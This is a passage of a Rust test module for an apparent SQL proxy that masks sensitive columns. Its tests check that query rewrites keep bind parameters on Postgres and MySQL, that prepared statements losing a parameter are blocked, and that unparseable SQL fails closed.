        let pg = Dialect::Postgres;
        let ok = outcome(
            Some("SELECT 'x' AS email"),
            vec![touched(SensitivePolicy::Mask)],
        );
        assert_eq!(rewrite_inconsistency(&ok, pg, &plain), None);
        // Mask read, no rewrite: the case the fail-safe exists for.
        let none = outcome(None, vec![touched(SensitivePolicy::Mask)]);
        assert!(rewrite_inconsistency(&none, pg, &plain).is_some());
        // ... except under monitor_mode, which never changes what runs.
        assert_eq!(rewrite_inconsistency(&none, pg, &monitor), None);
        // MySQL has a rewrite too (engine 3.7.0); Oracle and MS SQL do not.
        assert_eq!(rewrite_inconsistency(&ok, Dialect::Mysql, &plain), None);
        for d in [Dialect::Oracle, Dialect::MsSql] {
            assert!(rewrite_inconsistency(&ok, d, &plain).is_some(), "{d:?}");
        }
        // Without a masked column, empty, or with a NUL: on both dialects.
        for d in [pg, Dialect::Mysql] {
            assert!(rewrite_inconsistency(&none, d, &plain).is_some(), "{d:?}");
            assert_eq!(rewrite_inconsistency(&none, d, &monitor), None, "{d:?}");
            let unmasked = outcome(Some("SELECT 1"), vec![touched(SensitivePolicy::Flag)]);
            assert!(rewrite_inconsistency(&unmasked, d, &plain).is_some());
            for bad in ["", "  ", "SELECT 1\0"] {
                let o = outcome(Some(bad), vec![touched(SensitivePolicy::Mask)]);
                assert!(rewrite_inconsistency(&o, d, &plain).is_some(), "{bad:?}");
            }
            // Nothing masked, nothing rewritten: not this check's business.
            let flag = outcome(None, vec![touched(SensitivePolicy::Flag)]);
            assert_eq!(rewrite_inconsistency(&flag, d, &plain), None);
        }
    }

    #[test]
    fn a_rewrite_must_keep_every_parameter() {
        assert_eq!(
            parameter_mismatch(
                "SELECT email FROM t WHERE id = $1",
                "SELECT 'x' AS email FROM t WHERE id = $1",
                Dialect::Postgres
            ),
            None
        );
        let lost = parameter_mismatch(
            "SELECT substring(card, $1, 4) FROM t WHERE id = $2",
            "SELECT '[redacted]'::text AS substring FROM t WHERE id = $2",
            Dialect::Postgres,
        )
        .unwrap();
        assert!(lost.contains("$1") && !lost.contains("$2"), "{lost}");
        assert!(parameter_mismatch("SELECT 1", "SELECT $1", Dialect::Postgres).is_some());
    }

    /// MySQL `?` placeholders are counted as the server counts them: not inside
    /// a string, a quoted identifier or a comment.
    #[test]
    fn mysql_placeholders_are_counted_like_the_server() {
        assert_eq!(mysql_placeholders("SELECT 1"), Some(0));
        assert_eq!(
            mysql_placeholders("SELECT email FROM t WHERE id = ? AND n > ?"),
            Some(2)
        );
        assert_eq!(
            mysql_placeholders(
                "SELECT '?', \"?\", `?` FROM t /* ? */ WHERE a = ? -- ?\n AND b = 'x\\'?' # ?"
            ),
            Some(1)
        );
        // Unterminated string: cannot be counted, so cannot be vouched for.
        assert_eq!(mysql_placeholders("SELECT 'abc"), None);
    }

    /// The server answers a COM_STMT_PREPARE with the statement's parameter
    /// count, and the client binds that many values on COM_STMT_EXECUTE. A
    /// rewrite that changes the count is refused.
    #[test]
    fn a_mysql_rewrite_must_keep_the_parameter_count() {
        let my = Dialect::Mysql;
        assert_eq!(
            parameter_mismatch(
                "SELECT email FROM t WHERE id = ?",
                "SELECT CONCAT(LEFT(email, 1), '***') AS email FROM t WHERE id = ?",
                my
            ),
            None
        );
        let lost = parameter_mismatch(
            "SELECT SUBSTRING(card, ?, 4) FROM t WHERE id = ?",
            "SELECT '[redacted]' AS `SUBSTRING(card, ?, 4)` FROM t WHERE id = ?",
            my,
        );
        // The `?` inside the quoted alias is not a parameter: 2 → 1.
        let lost = lost.expect("a lost parameter is refused");
        assert!(lost.contains("2") && lost.contains("1"), "{lost}");
        assert!(parameter_mismatch("SELECT 1", "SELECT ?", my).is_some());
        assert!(parameter_mismatch("SELECT ?", "SELECT 'unterminated", my).is_some());
    }

    /// The `?` check on a COM_STMT_PREPARE blocks with VERICTO-085 and a
    /// message; a COM_QUERY, which has no parameters to bind, is not checked.
    #[test]
    fn a_mysql_prepare_whose_rewrite_loses_a_parameter_is_blocked() {
        let forward = || TcpDecision::Forward {
            observation: None,
            violations: Vec::new(),
            rewritten_query: Some("SELECT '[redacted]' AS c FROM t".to_string()),
            sensitive_columns: vec![touched(SensitivePolicy::Mask)],
        };
        let sql = "SELECT SUBSTRING(card, ?, 4) AS c FROM t";
        match checked_for_kind(forward(), sql, Dialect::Mysql, QueryKind::Prepared) {
            TcpDecision::Block {
                rule_code,
                ast_node_path,
                sensitive_columns,
                ..
            } => {
                assert_eq!(rule_code, SENSITIVE_RULE_CODE);
                assert!(ast_node_path.contains("parameter"), "{ast_node_path}");
                assert_eq!(sensitive_columns.len(), 1);
            }
            TcpDecision::Forward { .. } => panic!("a lost `?` must block"),
        }
        assert!(matches!(
            checked_for_kind(forward(), sql, Dialect::Mysql, QueryKind::Simple),
            TcpDecision::Forward {
                rewritten_query: Some(_),
                ..
            }
        ));
    }

    /// A masked expression over a bind parameter keeps the parameter (engine
    /// 3.6.1), so a Parse is forwarded rewritten, like a simple query. The
    /// parameter check stays as a safety net (`parameter_mismatch` above).
    #[test]
    fn a_masked_parameter_is_kept_on_parse_and_simple_query() {
        let sql = "SELECT substring(email, $1, 4) FROM customers LIMIT 1";
        let rules = default_ruleset();
        let policy = mask_email();
        match evaluate_message(sql, Dialect::Postgres, QueryKind::Prepared, &rules, &policy) {
            TcpDecision::Forward {
                rewritten_query: Some(q),
                ..
            } => assert!(q.contains("$1"), "{q}"),
            _ => panic!("expected a rewritten Forward"),
        }
        assert!(matches!(
            evaluate_message(sql, Dialect::Postgres, QueryKind::Simple, &rules, &policy),
            TcpDecision::Forward {
                rewritten_query: Some(_),
                ..
            }
        ));
    }

    // Parse error, fail-closed (Block) → Block with VERICTO-PARSE-ERROR.
    #[test]
    fn parse_error_fail_closed_blocks() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy {
            parse_error: ParseErrorAction::Block,
            ..EnforcementPolicy::default()
        };
        let decision = evaluate("NOT A VALID SQL @@@", Dialect::Postgres, &rules, &policy);
        match decision {
            TcpDecision::Block { rule_code, .. } => {
                assert_eq!(rule_code, "VERICTO-PARSE-ERROR");
            }
            TcpDecision::Forward { .. } => {
                panic!("parse-error fail-closed must Block, not Forward")
            }
        }
    }
}
